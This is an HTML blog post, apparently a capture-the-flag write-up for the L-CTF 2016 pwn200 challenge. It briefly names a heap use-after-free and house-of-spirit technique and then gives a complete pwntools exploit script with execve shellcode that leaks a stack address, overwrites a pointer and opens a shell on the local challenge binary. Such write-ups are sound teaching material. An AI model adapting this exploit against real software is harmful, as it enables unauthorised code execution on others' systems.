@@ -1,0 +1,92 @@
+<!doctype html>
+<html lang="en">
+    <head>
+		
+        <meta http-equiv="Content-Type" content="text/html" charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <meta name="description" content="Browser Security">
+        <link rel="shortcut icon" href="https://miao.su/images/2017/11/01/19367566_1417333275024768_5995578623556321280_ndd7d5.jpg"/>
+        <link rel="alternate" type="application/rss+xml" title="math1as" href="/atom.xml">
+        <title>L-CTF-2016-pwn200 | math1as&#39; blog</title>
+        <meta name="description" content="{{meta_description}}">
+
+        <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+        <link rel="stylesheet" type="text/css" href="/styles/crisp.css">
+        <meta name="HandheldFriendly" content="True" />
+        <meta name="MobileOptimized" content="320" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+    </head>
+    
+		<body class="post-template">
+	
+
+        <header id="header">
+            <a id="logo" href="/"><img src="https://miao.su/images/2017/11/01/19367566_1417333275024768_5995578623556321280_ndd7d5.jpg" alt="math1as' blog" /></a>
+            <h1><a href="/">math1as</a></h1>
+            <p>Security Researcher</p>
+            <div id="follow-icons">
+              <a href="http://twitter.com/Ma7h1as"><i class="fa fa-twitter-square fa-2x"></i></a>
+          <a href="/atom.xml"><i class="fa fa-rss-square fa-2x"></i></a>
+  </div>
+<h6><a href="/About">About</a></h6>
+<h6><a href="/friendlink">Friendlink</a></h6
+<h6><a href="/papers">Papers</a></h6>
+<h6><a href="/Credit">Credit</a></h6>
+<h6><a href="/Bounty">Bounty</a></h6>
+        </header>
+
+        <main id="content">
+        
+
+<article class="post">
+  April 9, 2017
+  
+
+  <h1 class="post-title">L-CTF-2016-pwn200</h1>
+  <section class="post-content article-entry">
+    <p>fastbin UAF + house of spirit</p>
+<p>off by one leak the address of RBP</p>
+<p>input money overwrite pointer that point to stack address</p>
+<p>and make a fake thunk struct here</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">raw_file=ELF(&apos;pwn200&apos;)</div><div class="line">libc=ELF(&apos;libc.so.6&apos;)</div><div class="line">p=process(&apos;pwn200&apos;)</div><div class="line">p.recvuntil(&apos;who are u?\n&apos;)</div><div class="line">def makeshellcode():</div><div class="line">    shellcode=&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73&quot;</div><div class="line">    shellcode+=&quot;\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</div><div class="line">    shellcode=shellcode.ljust(47,&apos;a&apos;)</div><div class="line">    shellcode+=&apos;m&apos;</div><div class="line">    return shellcode</div><div class="line">def leakrbp():</div><div class="line">    p.recvuntil(&apos;m&apos;)</div><div class="line">    result=p.recvuntil(&apos;, w&apos;)</div><div class="line">    rbp_addr=u64(result[:-3].ljust(0x8,&apos;\x00&apos;))</div><div class="line">    return rbp_addr</div><div class="line">shellcode=makeshellcode()</div><div class="line">p.send(shellcode)</div><div class="line">rbp_addr=leakrbp()</div><div class="line">print &quot;rbp_addr is &quot;,hex(rbp_addr)</div><div class="line">target_addr=rbp_addr-0x90</div><div class="line">shellcode_addr=rbp_addr-0x50</div><div class="line">p.recvuntil(&apos;id ~~?&apos;)</div><div class="line">p.send(&apos;32&apos;+&apos;\n&apos;)</div><div class="line">p.recvuntil(&apos;money~&apos;)</div><div class="line">payload=p64(0)*4+p64(0)+p64(0x41)</div><div class="line">payload=payload.ljust(0x38,&apos;\x00&apos;)+p64(target_addr)</div><div class="line">p.send(payload)</div><div class="line">p.recvuntil(&apos;choice : &apos;)</div><div class="line">p.send(&apos;2&apos;+&apos;\n&apos;)</div><div class="line">p.recvuntil(&apos;choice : &apos;)</div><div class="line">p.send(&apos;1&apos;+&apos;\n&apos;)</div><div class="line">p.recvuntil(&apos;long?&apos;)</div><div class="line">p.send(&apos;48\n&apos;)</div><div class="line">p.recvuntil(&apos;48\n&apos;)</div><div class="line">data=&apos;a&apos;*0x18+p64(shellcode_addr)</div><div class="line">data=data.ljust(48,&apos;\x00&apos;)</div><div class="line">p.send(data)</div><div class="line">p.recvuntil(&apos;choice : &apos;)</div><div class="line">p.send(&apos;3\n&apos;)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+
+  </section>
+  <footer class="post-footer">
+    <!--
+    <section class="author">
+      <h4>math1as</h4>
+      <p></p>
+    </section>
+    -->
+  </footer>
+</article>
+
+<nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="/2017/09/08/Chrome-unsafe-inline-CSP-Bypass/">
+        ← prev <!--inherited strategy in Chrome CSP Bypass-->
+    </a>
+    
+    <span class="page-number">•</span>
+    
+    <a class="older-posts" href="/2016/05/07/linux-x64-common-ropgadget/">
+        <!--linux x64 common ropgadget--> next →
+    </a>
+    
+</nav>
+
+
+        </main>
+        <footer id="footer">
+            <section id="footer-message">&copy; 2017 math1as.</section>
+       </footer>
+    </body>
+</html>
+
+
